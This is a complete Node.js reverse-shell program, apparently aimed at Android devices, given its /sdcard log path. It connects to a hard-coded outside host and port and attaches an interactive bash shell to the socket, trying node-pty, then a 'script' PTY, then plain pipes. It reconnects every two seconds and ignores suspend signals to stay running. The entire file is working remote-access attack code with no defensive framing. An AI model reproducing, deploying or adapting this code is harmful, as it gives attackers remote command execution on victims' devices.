
const net = require('net');
const { spawn } = require('child_process');
const fs = require('fs');

const HOST = 'official-fires.gl.at.ply.gg';
const PORT = 56494;
const RECONNECT_MS = 2000;
const LOG = '/sdcard/rev.log';

function log(...args) {
  const s = `[${new Date().toISOString()}] ${args.join(' ')}\n`;
  try { fs.appendFileSync(LOG, s); } catch (_) {}
  process.stdout.write(s);
}

// ignore suspend signals so process isn't backgrounded
try {
  process.on('SIGTSTP', () => log('SIGTSTP ignored'));
  process.on('SIGTTIN', () => log('SIGTTIN ignored'));
  process.on('SIGTTOU', () => log('SIGTTOU ignored'));
} catch (e) {}
try { process.on('SIGCONT', () => log('SIGCONT (continued)')); } catch (e) {}

process.stdin.resume();

let activeShell = null;
let activeSock  = null;

function cleanupActive() {
  if (activeSock) {
    try { activeSock.removeAllListeners(); activeSock.destroy(); } catch(e){}
    activeSock = null;
  }
  if (activeShell) {
    try { activeShell.removeAllListeners(); activeShell.kill(); } catch(e){}
    activeShell = null;
  }
}

function spawnShellForSocket(sock) {
  cleanupActive();
  activeSock = sock;
  sock.setEncoding('utf8');

  let pty = null;
  try { pty = require('node-pty'); } catch (e) { pty = null; }

  if (pty) {
    try {
      const sh = pty.spawn('/bin/bash', ['-i'], {
        name: process.env.TERM || 'xterm-256color',
        cols: 80, rows: 24, cwd: process.env.HOME || '/'
      });
      activeShell = sh;

      sh.on('data', d => { try { sock.write(d); } catch (e){} });
      sock.on('data', d => { try { sh.write(d.toString()); } catch(e){} });

      sock.on('close', () => { log('socket closed (pty)'); try{ sh.kill(); } catch(e){}; cleanupActive(); });
      sock.on('error', (err) => { log('socket error (pty)', err && err.code ? err.code : err); try{ sh.kill(); } catch(e){}; cleanupActive(); });

      sh.on('exit', (code) => { log('pty shell exit', code); try { sock.end(`[*] shell exit ${code}\n`); } catch(e){}; cleanupActive(); });

      log('spawned node-pty shell and attached to socket');
      return;
    } catch (err) {
      log('node-pty spawn failed', err && err.message ? err.message : err);
    }
  }

  // === NEW: PTY-backed fallback using "script" ===
  // script -q -c /bin/bash /dev/null
  // this makes script allocate a pty for the bash child and proxies I/O via pipes
  try {
    const sh = spawn('script', ['-q', '-c', '/bin/bash', '/dev/null'], { stdio: ['pipe','pipe','pipe'] });
    activeShell = sh;

    sh.stdout.on('data', d => { try { sock.write(d); } catch(e){} });
    sh.stderr.on('data', d => { try { sock.write(d); } catch(e){} });

    sock.on('data', d => {
      const s = d.toString();
      try {
        // write raw into script's stdin; do NOT auto-add newline
        sh.stdin.write(s);
      } catch(e) {}
    });

    sock.on('close', () => { log('socket closed (script fallback)'); try { sh.kill(); } catch (e){}; cleanupActive(); });
    sock.on('error', (err) => { log('socket error (script fallback)', err && err.code ? err.code : err); try { sh.kill(); } catch (e){}; cleanupActive(); });

    sh.on('exit', (code) => { log('script-backed shell exit', code); try { sock.end(`[*] shell exit ${code}\n`); } catch (e){}; cleanupActive(); });

    log('spawned script-backed pty /bin/bash and attached to socket');
    return;
  } catch (e) {
    log('script fallback failed', e && e.message ? e.message : e);
  }

  // final fallback (if script/pty both missing) — pipe/bash may be non-interactive
  try {
    const sh = spawn('/bin/bash', ['-i'], { stdio: ['pipe','pipe','pipe'] });
    activeShell = sh;

    sh.stdout.on('data', d => { try { sock.write(d); } catch(e){} });
    sh.stderr.on('data', d => { try { sock.write(d); } catch(e){} });

    sock.on('data', d => {
      const s = d.toString();
      try {
        if (!s.endsWith('\n')) sh.stdin.write(s + '\n');
        else sh.stdin.write(s);
      } catch(e) {}
    });

    sock.on('close', () => { log('socket closed (final fallback)'); try { sh.kill(); } catch (e){}; cleanupActive(); });
    sock.on('error', (err) => { log('socket error (final fallback)', err && err.code ? err.code : err); try { sh.kill(); } catch (e){}; cleanupActive(); });

    sh.on('exit', (code) => { log('final fallback shell exit', code); try { sock.end(`[*] shell exit ${code}\n`); } catch (e){}; cleanupActive(); });

    log('spawned fallback /bin/bash and attached to socket (last resort)');
  } catch (e) {
    log('all spawn methods failed', e && e.message ? e.message : e);
    cleanupActive();
  }
}

function connect() {
  const sock = new net.Socket();
  sock.setKeepAlive(true);

  sock.on('error', (err) => { log('connect socket error', err && err.code ? err.code : err); });

  sock.connect(PORT, HOST, () => {
    log('connected to', `${HOST}:${PORT}`);
    sock.write('[*] connected\n');

    if (activeShell || activeSock) {
      log('existing shell/sock present - cleaning before attach');
      cleanupActive();
    }

    spawnShellForSocket(sock);
  });

  sock.on('close', () => {
    log('socket closed (connect callback)');
    cleanupActive();
    setTimeout(connect, RECONNECT_MS);
  });
}

process.on('uncaughtException', e => log('uncaughtException', e && e.stack ? e.stack : e));
process.on('unhandledRejection', e => log('unhandledRejection', e && e.stack ? e.stack : e));

log('starting improved snitch (script-pty fallback)');
connect();
